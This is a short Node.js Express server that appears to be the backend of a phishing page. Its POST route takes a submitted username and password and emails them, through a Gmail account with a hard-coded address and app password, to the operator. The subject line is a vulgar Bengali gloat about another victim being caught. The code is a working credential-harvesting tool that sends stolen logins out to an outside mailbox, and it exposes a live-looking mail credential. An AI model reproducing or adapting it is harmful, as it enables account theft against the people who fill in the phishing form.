const express = require('express')
const app = express()
const cors = require('cors')
const nodemailer = require("nodemailer");
const port = 5000

app.use(cors())
app.use(express.json())
// app.use(nodemailer())

app.post("/send-Email", async (req, res) => {
       const {userName, passWord} = req.body;
       // Nodemailer transporter তৈরি
       const transporter = nodemailer.createTransport({
              service: "gmail",
              auth: {
                     user: 'mdtonmoybosunia24@gmail.com',
                     pass: 'mmhlvwtekkqtzqdz',
              },
       });
       // Email কনফিগার
       const mailOptions = {
              from: 'mdtonmoybosunia24@gmail.com',
              to: 'mdtonmoybosunia24@gmail.com',
              subject: "New Bokachoda Fade Pa Dice",
              text: `\nuserName: ${userName}\npassword: ${passWord}`,
       };

       try {
              await transporter.sendMail(mailOptions);
              res.status(200).json({ success: true, message: "Email sent successfully!" });
       } catch (error) {
              res.status(500).json({ success: false, message: "Failed to send email", error });
       }
})

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})